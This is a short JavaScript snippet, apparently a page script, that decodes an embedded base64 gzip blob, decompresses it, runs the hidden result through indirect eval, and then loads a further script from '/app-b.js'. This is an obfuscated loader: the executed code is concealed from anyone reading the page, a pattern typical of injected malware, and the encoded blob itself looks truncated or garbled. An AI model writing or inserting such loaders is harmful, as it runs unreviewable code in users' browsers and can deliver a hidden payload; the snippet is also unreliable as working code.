(async function(){
var b64='H4sIAFuQ2moC/+19XW8bR5Lme35FDRT2kACJ4Uj2jF4IimJ3SWqQKEKybZgP0N1UsppoV9HVZEtyDL8H+8F+8B+wN8DAe7A3e7PArv1b9p/YP+D8AZonMyurqqvaJEeld3oPi8PNLlrFrPyIjIyMjIiMiLrXj8dp5r38avf1';
var bin=Uint8Array.from(atob(b64),function(c){return c.charCodeAt(0);});
var ds=new DecompressionStream("gzip");
var stream=new Blob([bin]).stream().pipeThrough(ds);
var text=await new Response(stream).text();
(0,eval)(text);
var s=document.createElement("script");s.src="/app-b.js";document.body.appendChild(s);
})().catch(function(e){console.error(e);});
